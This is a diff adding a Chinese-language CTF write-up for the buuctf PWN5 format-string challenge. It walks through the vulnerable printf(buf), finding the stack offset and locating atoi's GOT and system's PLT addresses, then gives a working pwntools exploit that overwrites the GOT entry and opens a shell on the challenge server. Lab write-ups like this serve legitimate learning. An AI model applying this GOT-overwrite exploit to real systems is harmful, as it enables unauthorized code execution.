@@ -246,3 +246,121 @@ payload=b'A'*44+p64(0x41348000)
 ```
 payload=b'I'*20+b'AAAA'+p32(getflag)
 ```
+
+6.格式化字符串的三种解法（buuctf PWN5）
+--
+
+查看文件，开启了Canary，NX，部分RELRO。<br>
+main函数：
+```
+int __cdecl main(int a1)
+{
+  unsigned int v1; // eax
+  int result; // eax
+  int fd; // [esp+0h] [ebp-84h]
+  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
+  char buf[100]; // [esp+14h] [ebp-70h] BYREF
+  unsigned int v6; // [esp+78h] [ebp-Ch]
+  int *v7; // [esp+7Ch] [ebp-8h]
+
+  v7 = &a1;
+  v6 = __readgsdword(0x14u);
+  setvbuf(stdout, 0, 2, 0);
+  v1 = time(0);
+  srand(v1);
+  fd = open("/dev/urandom", 0);
+  read(fd, &dword_804C044, 4u);
+  printf("your name:");
+  read(0, buf, 0x63u);
+  printf("Hello,");
+  printf(buf);
+  printf("your passwd:");
+  read(0, nptr, 0xFu);
+  if ( atoi(nptr) == dword_804C044 )
+  {
+    puts("ok!!");
+    system("/bin/sh");
+  }
+  else
+  {
+    puts("fail");
+  }
+  result = 0;
+  if ( __readgsdword(0x14u) != v6 )
+    sub_80493D0();
+  return result;
+}
+```
+由于开了Canary，首先考虑格式化字符串漏洞。 printf(buf)这里确实存在该漏洞。
+<br>
+对于重点部分的解读：
+```
+ fd = open("/dev/urandom", 0); // 读取随机数文件
+  read(fd, &dword_804C044, 4u); // fd , &dword_804C044 , 4u 分别代表： fd 文件描述符 ； &dword_804C044 用于临时存放读取到的数据 ； 4u 欲读取到的数据 ； 返回值 实际读到的字节数。类型为 long int。在这里表示 从 fd 中读取随机数，存放进 &dword_804C044 中，预设读取大小为 4u
+  printf("your name:");
+  read(0, buf, 0x63u); // 读取键盘输入的数据，大小为 63
+  printf("Hello,");
+  printf(buf);
+  printf("your passwd:");
+  read(0, nptr, 0xFu); // 读取键盘输入的数据 大小为 0xF 的字符串，使得password = buf 即可获取shell
+```
+
+
+首先计算偏移，输入：
+```
+aaaa %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
+```
+![image](https://github.com/xhsy0314/Task/assets/84487619/20fa66c8-9f42-4183-ab15-dc54863a5e8f)
+<br>
+看出偏移量为10.
+
+**解法1：使用pwntools的 fmtstr_payload 函数**(目前最理解的一种)<br>
+
+_原理：因为No PIE，可以直接格式化字符串篡改atoi为system。使用 fmtstr_payload 进行简化格式化字符串，通过替换atoi提前调用system，再手动输入/bin/sh获取shell。_
+
+
+```
+fmtstr_payload(offset, {printf_got: system_addr})
+fmtstr_payload(偏移，{原地址：目的地址})
+```
+本题中原地址就是atoi的got表地址，目的地址就为system的plt地址。
+<br>
+那么现在通过ida找到这两个地址：
+
+**atoi_got:**
+双击函数列表中的atoi，可以看到外部引用的地址。<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/52cbe470-216c-4fb5-8478-980110825204)
+<br>
+
+双击这里的偏移，即可跳转到plt地址。<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/7f75b66e-90d5-4bf0-b37f-bf94e4e08eee)
+<br>
+
+![image](https://github.com/xhsy0314/Task/assets/84487619/2e734045-adb5-4286-9178-3a23cf43e41f)
+<br>
+看到这里仍存在跳转指令，继续双击，找到got表地址。<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/5ee0647b-f0b2-4a85-b5d0-9661ea7d1b9f)
+<br>
+所以atoi_got=0x0804C034
+
+**sys_plt**:
+直接能找到为0x08049080<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/6e3dac22-a3a3-4cf3-86dd-e9e32d03623f)
+<br>
+
+**exp1：**
+```
+from pwn import *
+							
+#p=process("./deadbeef")
+io=remote("node4.buuoj.cn",28012)
+atoi_got=0x0804C034
+sys_plt=0x08049080
+payload=fmtstr_payload(10,{atoi_got:sys_plt})
+
+io.recv()
+io.sendline(payload)
+io.recv()
+io.sendline('/bin/sh\x00')
+io.interactive()
+```
